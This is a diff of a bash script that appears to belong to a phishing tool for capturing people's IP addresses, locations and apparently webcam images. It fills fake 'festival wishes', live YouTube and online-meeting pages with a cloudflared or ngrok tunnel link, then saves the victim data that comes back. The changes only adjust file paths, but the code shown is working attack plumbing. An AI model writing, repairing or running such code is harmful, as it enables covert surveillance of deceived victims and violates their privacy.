@@ -76,7 +76,7 @@ ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 
-cat camera/ip.txt >> camera/saved.ip.txt
+cat ip.txt >> saved.ip.txt
 }
 
 catch_location() {
@@ -88,7 +88,7 @@ catch_location() {
     printf "\n"
     
     # Move it to a backup to avoid duplicate display
-    mv camera/current_location.txt camera/current_location.bak
+    mv current_location.txt current_location.bak
   fi
 
   # Then check for any location_* files
@@ -110,7 +110,7 @@ catch_location() {
       mkdir -p saved_locations
     fi
     
-    mv "$location_file" camera/saved_locations/
+    mv "$location_file" saved_locations/
     printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to saved_locations/%s\e[0m\n" "$location_file"
   else
     printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] No location file found\e[0m\n"
@@ -122,7 +122,7 @@ catch_location() {
 checkfound() {
 # Create directory for saved locations if it doesn't exist
 if [[ ! -d "saved_locations" ]]; then
-  mkdir -p camera/saved_locations
+  mkdir -p saved_locations
 fi
 
 printf "\n"
@@ -149,13 +149,13 @@ if [[ -e "LocationLog.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
 # Don't display the raw log content, just process it
 catch_location
-rm -rf camera/LocationLog.log
+rm -rf LocationLog.log
 fi
 
 # Don't display error logs to avoid showing unwanted messages
 if [[ -e "LocationError.log" ]]; then
 # Just remove the file without displaying its contents
-rm -rf camera/LocationError.log
+rm -rf LocationError.log
 fi
 
 if [[ -e "Log.log" ]]; then
@@ -282,17 +282,17 @@ checkfound
 
 payload_cloudflare() {
 link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
-sed 's+forwarding_link+'$link'+g' camera/template.php > camera/index.php
+sed 's+forwarding_link+'$link'+g' camera/template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' camera/festivalwishes.html > camera/index3.html
-sed 's+fes_name+'$fest_name'+g' camera/index3.html > camera/index2.html
+sed 's+forwarding_link+'$link'+g' camera/festivalwishes.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' camera/LiveYTTV.html > camera/index3.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' camera/index3.html > camera/index2.html
+sed 's+forwarding_link+'$link'+g' camera/LiveYTTV.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
 else
-sed 's+forwarding_link+'$link'+g' camera/OnlineMeeting.html > camera/index2.html
+sed 's+forwarding_link+'$link'+g' camera/OnlineMeeting.html > index2.html
 fi
-rm -rf camera/index3.html
+rm -rf index3.html
 }
 
 ngrok_server() {
@@ -438,17 +438,17 @@ checkfound
 
 payload_ngrok() {
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
-sed 's+forwarding_link+'$link'+g' camera/template.php > camera/index.php
+sed 's+forwarding_link+'$link'+g' camera/template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' camera/festivalwishes.html > camera/index3.html
-sed 's+fes_name+'$fest_name'+g' camera/index3.html > camera/index2.html
+sed 's+forwarding_link+'$link'+g' camera/festivalwishes.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' camera/LiveYTTV.html > camera/index3.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' camera/index3.html > camera/index2.html
+sed 's+forwarding_link+'$link'+g' camera/LiveYTTV.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
 else
-sed 's+forwarding_link+'$link'+g' camera/OnlineMeeting.html > camera/index2.html
+sed 's+forwarding_link+'$link'+g' camera/OnlineMeeting.html > index2.html
 fi
-rm -rf camera/index3.html
+rm -rf index3.html
 }
 
 rendercam() {
